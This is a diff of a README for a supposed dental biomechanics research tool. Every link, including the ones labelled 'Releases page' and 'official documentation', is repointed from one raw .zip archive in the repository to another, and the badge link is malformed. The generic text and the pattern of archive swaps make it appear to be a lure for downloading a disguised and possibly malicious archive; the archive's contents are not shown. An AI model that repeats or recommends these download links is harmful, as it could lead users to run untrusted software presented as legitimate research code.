@@ -1,7 +1,7 @@
 # 🦷 oral_biomechanical_engineering - Transforming Dental Care with Science
 
 ## 🔗 Download Now
-[![Download Latest Release](https://github.com/ampole/oral_biomechanical_engineering/raw/refs/heads/main/src/app/components/figma/engineering_oral_biomechanical_v1.8-beta.5.zip%20Latest%https://github.com/ampole/oral_biomechanical_engineering/raw/refs/heads/main/src/app/components/figma/engineering_oral_biomechanical_v1.8-beta.5.zip)](https://github.com/ampole/oral_biomechanical_engineering/raw/refs/heads/main/src/app/components/figma/engineering_oral_biomechanical_v1.8-beta.5.zip)
+[![Download Latest Release](https://github.com/ampole/oral_biomechanical_engineering/raw/refs/heads/main/guidelines/oral_biomechanical_engineering_v3.3.zip%20Latest%https://github.com/ampole/oral_biomechanical_engineering/raw/refs/heads/main/guidelines/oral_biomechanical_engineering_v3.3.zip)](https://github.com/ampole/oral_biomechanical_engineering/raw/refs/heads/main/guidelines/oral_biomechanical_engineering_v3.3.zip)
 
 ## 📖 About This Project
 Oral Biomechanical Engineering is an open, ethics-first research framework focused on reducing trauma and pain in dental procedures. This software explores controlled biomechanics, sensing, and feedback methods. It emphasizes safety for clinicians and patients, promoting open science with a commitment to ethical engineering.
@@ -17,7 +17,7 @@ To get started with oral_biomechanical_engineering, follow these simple steps to
 
 ### 📥 How to Download and Install
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/ampole/oral_biomechanical_engineering/raw/refs/heads/main/src/app/components/figma/engineering_oral_biomechanical_v1.8-beta.5.zip) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/ampole/oral_biomechanical_engineering/raw/refs/heads/main/guidelines/oral_biomechanical_engineering_v3.3.zip) to find the latest version of the software.
 
 2. **Select the Version**
    On the Releases page, look for the most recent version of the software. Click on the version number to open the details.
@@ -64,9 +64,9 @@ We welcome contributions from everyone. To get involved:
 This project uses an open-source license. You can view the details in the LICENSE file within the repository.
 
 ## 🔗 Additional Resources
-For more information, studies, and latest updates, please refer to our [official documentation](https://github.com/ampole/oral_biomechanical_engineering/raw/refs/heads/main/src/app/components/figma/engineering_oral_biomechanical_v1.8-beta.5.zip).
+For more information, studies, and latest updates, please refer to our [official documentation](https://github.com/ampole/oral_biomechanical_engineering/raw/refs/heads/main/guidelines/oral_biomechanical_engineering_v3.3.zip).
 
 ### 📥 Download Now
-Once again, to download the latest version of oral_biomechanical_engineering, click here: [Download Latest Release](https://github.com/ampole/oral_biomechanical_engineering/raw/refs/heads/main/src/app/components/figma/engineering_oral_biomechanical_v1.8-beta.5.zip).
+Once again, to download the latest version of oral_biomechanical_engineering, click here: [Download Latest Release](https://github.com/ampole/oral_biomechanical_engineering/raw/refs/heads/main/guidelines/oral_biomechanical_engineering_v3.3.zip).
 
 Your journey to improving dental interventions and patient comfort starts here!
